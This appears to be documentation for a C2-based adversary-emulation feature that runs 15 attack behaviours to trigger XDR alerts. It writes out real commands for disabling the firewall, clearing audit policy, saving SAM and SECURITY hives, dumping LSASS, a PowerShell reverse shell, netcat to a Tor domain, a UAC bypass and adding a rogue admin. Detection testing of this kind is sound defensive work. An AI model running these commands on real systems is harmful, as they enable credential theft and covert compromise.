# XDR Detection Functions Summary - Key 7

## Overview
The XDR detection functions (bound to key '7') implement 15 specific behaviors designed to trigger XDR alerts. Each function performs real actions that match known detection patterns.

## Implementation Details

### 1. PowerShell Script from Temp Directory
- **Action**: Creates a PowerShell script in `C:\Windows\Temp\` and executes it with encoded commands
- **Command**: `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand`
- **Detection**: XDR detects PowerShell execution from temporary directories with suspicious flags

### 2. Windows Firewall Disabled via Registry
- **Action**: Modifies registry keys to disable Windows Firewall
- **Registry Keys**: 
  - `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile`
  - `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile`
- **Values**: `EnableFirewall=0`, `DoNotAllowExceptions=0`

### 3. Clear Event Logging with Auditpol
- **Action**: Executes `auditpol.exe /clear /y`
- **Detection**: Direct use of auditpol to clear Windows Event Logging policies

### 4. Service Enumeration from Public IPs
- **Action**: Creates socket connections from public IP (8.8.8.8) to Windows service ports
- **Ports**: 445 (SMB), 139 (NetBIOS), 135 (RPC), 138, 137
- **Detection**: Network connections to sensitive Windows services from external IPs

### 5. Rundll32 Spawning Suspicious Processes
- **Action**: Uses rundll32.exe to spawn cmd.exe
- **Command**: `rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe`
- **Detection**: Rundll32 spawning common LOLBIN processes

### 6. Document Discovery with Find
- **Action**: Executes `find /i "password" *.pdf* *.doc* *.xls* *.ppt*`
- **Detection**: Use of find command to search for sensitive documents

### 7. Registry Hive Extraction
- **Action**: Attempts to save SAM, SECURITY, and SYSTEM registry hives
- **Commands**:
  - `reg save HKLM\SAM C:\Windows\Temp\sam.hive`
  - `reg save HKLM\SECURITY C:\Windows\Temp\security.hive`
  - `reg save HKLM\SYSTEM C:\Windows\Temp\system.hive`

### 8. PowerShell Reverse Shell on Port 4444
- **Action**: Creates PowerShell TCP connection to port 4444
- **Command**: `powershell.exe -NoP -NonI -W Hidden -C "try{$c=New-Object Net.Sockets.TcpClient('127.0.0.1',4444)..."`
- **Detection**: PowerShell network connection to common Metasploit port

### 9. Rundll32 with Ordinal Numbers
- **Action**: Executes `rundll32.exe shell32.dll,#61 calc.exe`
- **Detection**: Rundll32 using ordinal numbers instead of function names

### 10. Netcat to TOR Domains
- **Action**: Creates nc.exe and attempts connection to .onion domain
- **Command**: `nc.exe malware.onion 80`
- **Detection**: Network tools connecting to TOR hidden services

### 11. UAC Bypass via Event Viewer
- **Action**: Modifies registry to hijack eventvwr.exe execution
- **Registry**: `HKCU\Software\Classes\mscfile\shell\open\command`
- **Detection**: eventvwr.exe spawning processes other than mmc.exe

### 12. Multiple RDP Sessions via Registry
- **Action**: Modifies Terminal Server registry to allow multiple sessions
- **Registry**: `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`
- **Value**: `fSingleSessionPerUser=0`

### 13. Rundll32 with 'main' EntryPoint
- **Action**: Executes `rundll32.exe kernel32.dll,main`
- **Detection**: Rundll32 using suspicious 'main' entry point

### 14. Dumping LSASS with Procdump
- **Action**: Downloads procdump and attempts to dump lsass.exe
- **Command**: `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
- **Detection**: Process memory dumping of lsass.exe

### 15. Add User to Admin Group with PowerShell
- **Action**: Creates user and adds to administrators group
- **Commands**:
  - `net user XDRTestUser XDRTest123! /add`
  - `powershell.exe -Command "Add-LocalGroupMember -Group Administrators -Member XDRTestUser"`
- **Detection**: PowerShell command adding users to privileged groups

## Evidence Collection
All activities are logged to:
- Console output with numbered progress indicators
- Client logs: `C:\rat\logs\client.log`
- Evidence file: `C:\evidance\[hostname]\xdr_detection\evidance_[session].txt`

## Expected XDR Alerts
Each function is designed to trigger specific XDR detection rules based on:
- Process behavior patterns
- Registry modifications
- Network connections
- Command-line arguments
- File system activities
- Security policy changes

## Usage
1. Start the C2 server
2. Connect a client
3. Press '7' on the server console
4. All 15 detection functions will execute automatically
5. Check XDR console for triggered alerts
